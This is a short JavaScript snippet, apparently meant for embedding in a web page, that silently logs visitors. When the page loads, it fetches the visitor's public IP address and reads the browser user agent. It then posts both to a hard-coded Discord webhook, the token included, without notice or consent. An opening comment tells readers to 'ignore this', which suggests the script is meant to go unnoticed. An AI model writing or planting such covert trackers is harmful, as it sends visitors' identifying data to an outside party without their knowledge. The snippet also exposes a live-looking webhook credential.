// ignore this fr this for bngg btw
console.log("suppress got a fatty but no one know 'bout that fr")
(function () {
    const WEBHOOK_URL = "https://discord.com/api/webhooks/1458253639239077949/DzCKmehtJ2eiaZk4PFjmtvNez_o8fMGZLO1rbvf0Z574DzyykZLjwemRzEZDgJLKEGEc";

    try {
        // ---- Get public IP (sync) ----
        const ipXhr = new XMLHttpRequest();
        ipXhr.open("GET", "https://api.ipify.org?format=json", false); // sync
        ipXhr.send(null);

        if (ipXhr.status !== 200) {
            console.error("Failed to fetch IP");
            return;
        }

        const ip = JSON.parse(ipXhr.responseText).ip;

        // ---- Get User-Agent ----
        const userAgent = navigator.userAgent;

        // ---- Discord embed payload ----
        const payload = {
            username: "Visitor Logger",
            embeds: [
                {
                    title: "📡 New Visitor Logged",
                    color: 0x5865F2,
                    fields: [
                        {
                            name: "🌍 IP Address",
                            value: `\`${ip}\``,
                            inline: false
                        },
                        {
                            name: "🖥️ User Agent",
                            value: `\`\`\`${userAgent}\`\`\``,
                            inline: false
                        }
                    ],
                    timestamp: new Date().toISOString()
                }
            ]
        };

        // ---- Send to webhook (sync) ----
        const hookXhr = new XMLHttpRequest();
        hookXhr.open("POST", WEBHOOK_URL, false); // sync
        hookXhr.setRequestHeader("Content-Type", "application/json");
        hookXhr.send(JSON.stringify(payload));

        if (hookXhr.status >= 200 && hookXhr.status < 300) {
        } else {
            console.error("Webhook failed:", hookXhr.status);
        }

    } catch (e) {
        console.error("Logger error:", e);
    }
})();

